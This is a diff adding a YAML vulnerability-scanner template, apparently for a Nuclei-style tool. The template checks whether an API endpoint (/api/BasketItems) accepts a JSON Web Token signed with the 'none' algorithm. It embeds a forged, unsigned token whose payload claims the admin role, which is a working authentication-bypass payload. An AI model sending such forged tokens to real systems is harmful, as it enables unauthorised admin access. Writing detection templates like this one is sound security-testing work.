@@ -1,0 +1,24 @@
+id: jwt-none-algorithm
+info:
+  name: JWT None Algorithm
+  severity: high
+  description: Detects JWT acceptance of 'none' algorithm
+  tags:
+    - jwt
+    - auth
+
+requests:
+  - name: "Test JWT with none algorithm"
+    method: POST
+    path: "/api/BasketItems"
+    headers:
+      Content-Type: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJyb2xlIjoiYWRtaW4ifX0."
+    body: '{"ProductId": 1, "quantity": 1, "BasketId": null, "price": 1.99}'
+    matchers:
+      - type: status
+        condition: in
+        values: [200, 201]
+    on_match:
+      vulnerability: JWT_NONE_ALGORITHM
+      message: "Application accepted JWT with 'none' algorithm"
